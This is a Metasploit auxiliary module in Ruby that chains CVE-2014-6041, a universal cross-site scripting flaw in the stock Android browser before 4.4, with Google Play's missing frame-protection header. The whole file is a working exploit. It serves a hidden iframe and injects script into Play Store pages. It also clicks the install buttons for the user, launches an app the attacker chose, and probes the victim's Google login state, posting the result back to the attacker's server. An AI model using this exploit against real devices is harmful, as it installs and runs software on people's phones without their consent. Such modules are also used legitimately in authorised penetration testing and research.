##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer::HTML
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Android Browser RCE Through Google Play Store XFO',
      'Description'    => %q{
        This module combines two vulnerabilities to achieve remote code
        execution on affected Android devices. First, the module exploits
        CVE-2014-6041, a Universal Cross-Site Scripting (UXSS) vulnerability present in
        versions of Android's open source stock browser (the AOSP Browser) prior to
        4.4. Second, the Google Play store's web interface fails to enforce a
        X-Frame-Options: DENY header (XFO) on some error pages, and therefore, can be
        targeted for script injection. As a result, this leads to remote code execution
        through Google Play's remote installation feature, as any application available
        on the Google Play store can be installed and launched on the user's device.

        This module requires that the user is logged into Google with a vulnerable browser.

        To list the activities in an APK, you can use `aapt dump badging /path/to/app.apk`.
      },
      'Author'         => [
        'Rafay Baloch', # Original UXSS vulnerability
        'joev'          # Play Store vector and Metasploit module
      ],
      'License'        => MSF_LICENSE,
      'Actions'        => [[ 'WebServer' ]],
      'PassiveActions' => [ 'WebServer' ],
      'References' => [
        [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/09/15/major-android-bug-is-a-privacy-disaster-cve-2014-6041'],
        [ 'URL', 'http://1337day.com/exploit/description/22581' ],
        [ 'OSVDB', '110664' ],
        [ 'CVE', '2014-6041' ]
      ],
      'DefaultAction'  => 'WebServer'
    ))

    register_options([
      OptString.new('PACKAGE_NAME', [
        true,
        'The package name of the app on the Google Play store you want to install',
        'com.swlkr.rickrolld'
      ]),
      OptString.new('ACTIVITY_NAME', [
        true,
        'The name of the activity in the apk to launch',
        'com.swlkr.rickrolld/.RickRoll'
      ]),
      OptBool.new('DETECT_LOGIN', [
        true, "Prevents the exploit from running if the user is not logged into Google", true
      ]),
      OptBool.new('HIDE_IFRAME', [
        true, "Hide the exploit iframe from the user", true
      ])
    ])
  end

  def on_request_uri(cli, request)
    print_status("Request '#{request.method} #{request.uri}'")

    if request.method.downcase == 'post'
      print_error request.body[0..400]
      send_response_html(cli, '')
    else
      print_status("Sending initial HTML ...")
      send_response_html(cli, exploit_html)
    end
  end

  def exploit_html
    <<-EOS
      <html>
      <body>
      <script>

      var APP_ID = '#{datastore['PACKAGE_NAME']}';
      var MAIN_ACTIVITY = '#{datastore['ACTIVITY_NAME']}';
      var HIDDEN_STYLE = '#{hidden_css}';

      function exploit() {

        var src = 'https://play.google.com/store/apps/'+(new Array(2000)).join('aaaaaaa');
        var frame = document.createElement('iframe');
        frame.setAttribute('src', src);
        frame.setAttribute('name', 'f');
        frame.setAttribute('style', HIDDEN_STYLE);
        function uxss(src) {
          window.open('\\u0000javascript:eval(atob("'+ btoa(src) +'"))', 'f');
        }

        var loaded = false;
        frame.onload = function() {
          if (loaded) return;
          loaded = true;
          setTimeout(function(){
            uxss('history.replaceState({},{},"/"); x=new XMLHttpRequest;x.open("GET", "/store/apps/details?id='+APP_ID+'");x.onreadystatechange=function(){'+
              'if(x.readyState==4){ document.open("text/html"); document.write(x.responseText); document.close(); top.postMessage("1", "*") }};x.send();');
          }, 100);
        };

        var i1, i2;
        var w = window;
        window.onmessage = function(event) {
          if (event.data === '1') {
            i1 = w.setInterval(function(){
              uxss('document.body.innerHTML.match(/This app is compatible/).length; document.querySelector("button.price").click(); top.postMessage("2", "*");');
            }, 500);
          } else if (event.data === '2') {
            w.clearInterval(i1);
            i2 = setInterval(function(){2
              uxss('document.querySelector("button.play-button.apps.loonie-ok-button").click(); top.postMessage("3", "*");');
              }, 500);
          } else if (event.data === '3') {
            clearInterval(i2);
            setTimeout(function(){
              setInterval(function(){
                frame.src = 'intent:launch#Intent;SEL;component='+MAIN_ACTIVITY+';end';
              }, 500);
            }, 1000);
          }
        }

        document.body.appendChild(frame);
      }

      #{detect_login_js}

      </script>

      </body>
      </html>
    EOS
  end

  def detect_login_js
    if datastore['DETECT_LOGIN']
      %Q|
        var img = document.createElement('img');
        img.onload = exploit;
        img.onerror = function() {
          var url = '#{backend_url}';
          var x = new XMLHttpRequest();
          x.open('POST', url);
          x.send('Exploit failed: user is not logged into google.com')
        };
        img.setAttribute('style', HIDDEN_STYLE);
        var rand = '&d=#{Rex::Text.rand_text_alphanumeric(rand(12)+5)}';
        img.setAttribute('src', 'https://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimages%2Flogos%2Faccounts_logo.png'+rand);
        document.body.appendChild(img);
      |
    else
      'exploit();'
    end
  end

  def hidden_css
    if datastore['HIDE_IFRAME']
      'position:absolute;left:-9999px;top:-9999px;height:1px;width:1px;visibility:hidden;'
    else
      ''
    end
  end

  def backend_url
    proto = (datastore["SSL"] ? "https" : "http")
    myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
    port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
    "#{proto}://#{myhost}#{port_str}/#{datastore['URIPATH']}/catch"
  end

  def run
    exploit
  end
end
